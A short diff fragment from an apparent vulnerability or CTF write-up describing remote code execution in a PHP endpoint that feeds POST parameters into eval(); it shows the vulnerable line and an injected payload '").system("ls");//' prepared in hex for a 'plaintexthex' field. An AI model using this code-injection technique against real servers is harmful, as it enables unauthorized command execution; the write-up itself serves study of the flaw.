@@ -69,7 +69,7 @@ if (isset($DEBUG) && $DEBUG == "true") { error_log($_POST['function']."($param_s
 eval("echo ".$_POST['function']."($param_string);");
 ```
 
-All we need to do is use `DEBUG=true` as the third key/value pair in the POST data, not counting the `function` parameter. This enables remote code execution:
+All we need to do is use `DEBUG=true` (or `x=true` — the key doesn’t really matter) as the third key/value pair in the POST data, not counting the `function` parameter. This enables remote code execution:
 
 ```bash
 $ echo -n '").system("ls");//' | xxd -p # will be used as the value for `plaintexthex`
